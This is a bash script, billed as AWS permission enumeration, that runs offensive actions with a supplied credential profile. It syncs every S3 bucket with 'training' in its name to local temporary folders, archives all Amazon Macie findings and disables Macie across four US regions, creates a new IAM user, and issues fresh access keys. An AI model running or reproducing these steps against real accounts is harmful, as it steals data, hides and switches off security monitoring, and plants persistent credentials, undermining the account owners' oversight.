#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Default profile if none specified
AWS_PROFILE=${1:-default}

echo "${YELLOW}[*] Starting AWS permission enumeration using profile: ${AWS_PROFILE}...${NC}\n"

# 1. Get current identity
echo "${GREEN}[+] Checking current identity...${NC}"
aws --profile ${AWS_PROFILE} sts get-caller-identity

# 2. List attached policies
echo "\n${GREEN}[+] Listing attached policies...${NC}"
aws --profile ${AWS_PROFILE} iam list-attached-user-policies --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# 3. List inline policies
echo "\n${GREEN}[+] Listing inline policies...${NC}"
aws --profile ${AWS_PROFILE} iam list-user-policies --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# 4. Check for sensitive permissions
echo "\n${GREEN}[+] Checking for sensitive permissions...${NC}"
aws --profile ${AWS_PROFILE} iam get-user-policy --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2) --policy-name inline-policy 2>/dev/null

# 5. List S3 buckets
echo "\n${GREEN}[+] Listing S3 buckets...${NC}"
BUCKETS=$(aws --profile ${AWS_PROFILE} s3 ls | awk '{print $3}')
echo "$BUCKETS"

# 5a. Look for buckets with 'training' in the name and attempt to download their files
for bucket in $BUCKETS; do
    if [[ "$bucket" == *training* ]]; then
        echo "${RED}[!] Found bucket with 'training' in the name: $bucket. Attempting to download contents...${NC}"
        TMPDIR=$(mktemp -d)
        echo "${YELLOW}[*] Downloading s3://$bucket to $TMPDIR ...${NC}"
        aws --profile ${AWS_PROFILE} s3 sync s3://$bucket "$TMPDIR"
        echo "${GREEN}[+] Download complete for $bucket. Files stored in $TMPDIR${NC}"
    fi
done

# 6. Try to list EC2 instances
echo "\n${GREEN}[+] Listing EC2 instances...${NC}"
aws --profile ${AWS_PROFILE} ec2 describe-instances

# 7. Check and attempt to disable Macie in all US regions
echo "\n${GREEN}[+] Checking for Macie in all US regions and attempting to disable...${NC}"
US_REGIONS=("us-east-1" "us-east-2" "us-west-1" "us-west-2")
for region in "${US_REGIONS[@]}"; do
    echo "${YELLOW}[*] Checking Macie status in $region...${NC}"
    macie_status=$(aws --profile ${AWS_PROFILE} --region $region macie2 get-macie-status 2>/dev/null)
    if echo "$macie_status" | grep -q '"status": "ENABLED"'; then
        echo "${RED}[!] Macie is ENABLED in $region. Archiving all findings before disabling...${NC}"
        # Archive all findings in the region
        FINDING_IDS=$(aws --profile ${AWS_PROFILE} --region $region macie2 list-findings --query 'findingIds' --output text 2>/dev/null)
        if [ -n "$FINDING_IDS" ]; then
            for finding_id in $FINDING_IDS; do
                aws --profile ${AWS_PROFILE} --region $region macie2 archive-findings --finding-ids $finding_id
            done
        else
            echo "${GREEN}[+] No findings to archive in $region.${NC}"
        fi
        echo "${RED}[!] Attempting to disable Macie in $region...${NC}"
        aws --profile ${AWS_PROFILE} --region $region macie2 disable-macie
    else
        echo "${GREEN}[+] Macie is not enabled in $region.${NC}"
    fi
done

# 8. Try to create a new IAM user
echo "\n${GREEN}[+] Attempting to create a new IAM user...${NC}"
aws --profile ${AWS_PROFILE} iam create-user --user-name test-user-$(date +%s)

# 9. Try to attach a policy
echo "\n${GREEN}[+] Attempting to attach a policy...${NC}"
aws --profile ${AWS_PROFILE} iam attach-user-policy --user-name test-user-$(date +%s) --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess

# 10. Check for existing access keys
echo "\n${GREEN}[+] Checking for existing access keys...${NC}"
aws --profile ${AWS_PROFILE} iam list-access-keys --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# 11. Try to create new access keys
echo "\n${GREEN}[+] Attempting to create new access keys...${NC}"
aws --profile ${AWS_PROFILE} iam create-access-key --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

echo "\n${YELLOW}[*] Enumeration complete. Check the output above for successful operations.${NC}" 